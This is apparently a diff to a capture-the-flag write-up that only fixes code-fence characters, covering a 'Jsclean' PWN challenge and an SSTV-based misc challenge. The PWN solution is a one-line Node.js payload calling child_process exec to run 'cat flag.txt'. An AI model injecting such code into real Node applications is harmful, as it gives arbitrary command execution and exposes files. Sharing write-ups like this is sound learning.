@@ -67,9 +67,9 @@ And we get the flag.
 
 ## PWN 
 - Jsclean: the python file is asking for a js file and a js code. In the python script we can see that it refers to index.js, so we know that this is the file to clean: index.js and the js code is: 
-´´´
+```
 require("child_process").exec("cat flag.txt", function(error, stdout, stderr){console.log(stdout);});
-´´´
+```
 
 ## Misc
 - Soundy: using a sstv decoder.
